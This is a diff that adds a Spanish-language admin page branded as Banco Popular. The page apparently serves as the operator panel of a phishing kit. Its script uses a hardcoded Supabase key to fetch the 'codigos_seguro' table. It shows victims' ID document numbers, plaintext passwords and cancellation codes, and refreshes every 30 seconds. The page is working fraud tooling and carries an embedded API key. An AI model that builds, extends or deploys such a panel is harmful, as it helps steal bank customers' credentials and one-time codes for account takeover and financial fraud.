@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Panel de Administración - Banco Popular</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f5f5f5;
+      padding: 20px;
+    }
+
+    .admin-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .admin-header {
+      background: #105163;
+      color: white;
+      padding: 24px;
+      text-align: center;
+    }
+
+    .admin-header h1 {
+      font-size: 24px;
+      font-weight: 600;
+    }
+
+    .admin-header p {
+      font-size: 14px;
+      margin-top: 8px;
+      opacity: 0.9;
+    }
+
+    .admin-content {
+      padding: 24px;
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .stat-card {
+      background: #f8f9fa;
+      border: 1px solid #e9ecef;
+      border-radius: 8px;
+      padding: 16px;
+      text-align: center;
+    }
+
+    .stat-card h3 {
+      font-size: 14px;
+      color: #6b7280;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .stat-card .number {
+      font-size: 32px;
+      font-weight: 700;
+      color: #105163;
+    }
+
+    .section {
+      margin-bottom: 24px;
+    }
+
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      padding-bottom: 12px;
+      border-bottom: 2px solid #e9ecef;
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #111827;
+    }
+
+    .refresh-btn {
+      background: #105163;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      transition: background 0.2s;
+    }
+
+    .refresh-btn:hover {
+      background: #0B3642;
+    }
+
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+    }
+
+    .data-table thead {
+      background: #f8f9fa;
+    }
+
+    .data-table th {
+      padding: 12px;
+      text-align: left;
+      font-weight: 600;
+      color: #374151;
+      border-bottom: 2px solid #e9ecef;
+    }
+
+    .data-table td {
+      padding: 12px;
+      border-bottom: 1px solid #e9ecef;
+      color: #111827;
+    }
+
+    .data-table tbody tr:hover {
+      background: #f8f9fa;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .badge-success {
+      background: #D4ECD0;
+      color: #1A6A0C;
+    }
+
+    .badge-warning {
+      background: #FEEBD7;
+      color: #F99B35;
+    }
+
+    .badge-info {
+      background: #DBEAFD;
+      color: #3263A4;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 40px;
+      color: #6b7280;
+    }
+
+    .empty-state svg {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 16px;
+      opacity: 0.5;
+    }
+
+    .loading {
+      text-align: center;
+      padding: 40px;
+      color: #6b7280;
+    }
+
+    .spinner {
+      border: 3px solid #e9ecef;
+      border-top: 3px solid #105163;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 16px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .timestamp {
+      font-size: 12px;
+      color: #6b7280;
+    }
+
+    .password-field {
+      font-family: monospace;
+      background: #f8f9fa;
+      padding: 4px 8px;
+      border-radius: 4px;
+      letter-spacing: 2px;
+    }
+
+    .alert-box {
+      background: #FEEBD7;
+      border: 1px solid #FCCD9A;
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .alert-box svg {
+      flex-shrink: 0;
+    }
+
+    .alert-box p {
+      font-size: 13px;
+      color: #C2410C;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="admin-container">
+    <div class="admin-header">
+      <h1>🔐 Panel de Administración</h1>
+      <p>Banco Popular - Gestión de Credenciales y Códigos</p>
+    </div>
+
+    <div class="admin-content">
+      <div class="alert-box">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#C2410C"/>
+        </svg>
+        <p><strong>Acceso restringido:</strong> Este panel contiene información sensible. Asegúrate de estar autorizado para visualizar estos datos.</p>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <h3>Total Registros</h3>
+          <div class="number" id="totalRecords">-</div>
+        </div>
+        <div class="stat-card">
+          <h3>Credenciales</h3>
+          <div class="number" id="totalCredentials">-</div>
+        </div>
+        <div class="stat-card">
+          <h3>Códigos Ingresados</h3>
+          <div class="number" id="totalCodes">-</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">
+          <h2 class="section-title">📋 Credenciales y Códigos Registrados</h2>
+          <button class="refresh-btn" onclick="loadData()">🔄 Actualizar</button>
+        </div>
+
+        <div id="dataContainer">
+          <div class="loading">
+            <div class="spinner"></div>
+            <p>Cargando datos...</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Configuración de Supabase
+    const SUPABASE_URL = 'https://sygnzkmuiejwczijthyq.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_nbw8hDNjy67X7Id8WCv8nw_nrfvOwSD';
+
+    // Función para cargar datos desde Supabase
+    async function loadData() {
+      const container = document.getElementById('dataContainer');
+      
+      try {
+        // Cargar todos los registros de la tabla codigos_seguro
+        const response = await fetch(SUPABASE_URL + '/rest/v1/codigos_seguro?select=*&order=created_at.desc', {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+            'apikey': SUPABASE_ANON_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+          }
+        });
+
+        if (!response.ok) {
+          throw new Error('Error al cargar datos: ' + response.status);
+        }
+
+        const data = await response.json();
+        
+        // Actualizar estadísticas
+        document.getElementById('totalRecords').textContent = data.length;
+        document.getElementById('totalCredentials').textContent = data.length;
+        document.getElementById('totalCodes').textContent = data.filter(item => item.codigo_cancelacion).length;
+
+        // Mostrar datos en tabla
+        if (data.length === 0) {
+          container.innerHTML = `
+            <div class="empty-state">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="#9ca3af"/>
+              </svg>
+              <p>No hay registros disponibles</p>
+            </div>
+          `;
+          return;
+        }
+
+        let tableHTML = `
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Tipo Documento</th>
+                <th>Número Documento</th>
+                <th>Contraseña</th>
+                <th>Código Cancelación</th>
+                <th>Fecha Registro</th>
+              </tr>
+            </thead>
+            <tbody>
+        `;
+
+        data.forEach((item, index) => {
+          const fecha = item.created_at ? new Date(item.created_at).toLocaleString('es-CO') : 'N/A';
+          const codigo = item.codigo_cancelacion ? 
+            `<span class="badge badge-success">${item.codigo_cancelacion}</span>` : 
+            `<span class="badge badge-warning">Pendiente</span>`;
+
+          tableHTML += `
+            <tr>
+              <td>${index + 1}</td>
+              <td>${item.tipo_documento || 'N/A'}</td>
+              <td><strong>${item.numero_documento || 'N/A'}</strong></td>
+              <td><span class="password-field">${item.contrasena || 'N/A'}</span></td>
+              <td>${codigo}</td>
+              <td><span class="timestamp">${fecha}</span></td>
+            </tr>
+          `;
+        });
+
+        tableHTML += `
+            </tbody>
+          </table>
+        `;
+
+        container.innerHTML = tableHTML;
+
+      } catch (error) {
+        console.error('Error:', error);
+        container.innerHTML = `
+          <div class="empty-state">
+            <p>❌ Error al cargar los datos</p>
+            <p style="font-size: 12px; color: #6b7280; margin-top: 8px;">${error.message}</p>
+          </div>
+        `;
+      }
+    }
+
+    // Cargar datos al iniciar la página
+    document.addEventListener('DOMContentLoaded', function() {
+      loadData();
+    });
+
+    // Auto-refresh cada 30 segundos
+    setInterval(loadData, 30000);
+  </script>
+</body>
+</html>
